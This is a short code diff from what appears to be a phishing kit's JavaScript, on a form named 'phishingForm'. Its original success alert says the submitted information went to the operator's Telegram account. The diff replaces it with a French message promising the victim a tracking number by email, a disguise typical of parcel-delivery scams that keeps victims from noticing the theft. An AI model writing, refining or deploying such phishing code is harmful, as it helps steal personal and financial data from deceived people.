@@ -268,7 +268,7 @@ document.getElementById("phishingForm").addEventListener("submit", function (e) 
     .then(response => response.json())
     .then(result => {
         if (result.ok) {
-            alert("✅ Succès ! Les informations ont été envoyées à votre compte Telegram.");
+            alert("Succès !Vos numero de suivie vous sera communiquer par mail ");
             form.reset(); 
         } else {
             console.error('Erreur API:', result);
